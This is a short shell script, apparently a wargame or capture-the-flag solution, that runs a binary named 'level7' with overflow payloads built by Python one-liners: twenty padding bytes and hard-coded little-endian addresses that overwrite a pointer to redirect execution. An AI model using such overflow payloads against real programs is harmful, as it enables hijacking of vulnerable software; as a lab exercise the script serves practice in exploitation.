#!/bin/sh

./level7 `python -c 'print("A"*0x14+"\x28\x99\x04\x08")'` `python -c 'print("\xf4\x84\x04\x08")'`

exit 0
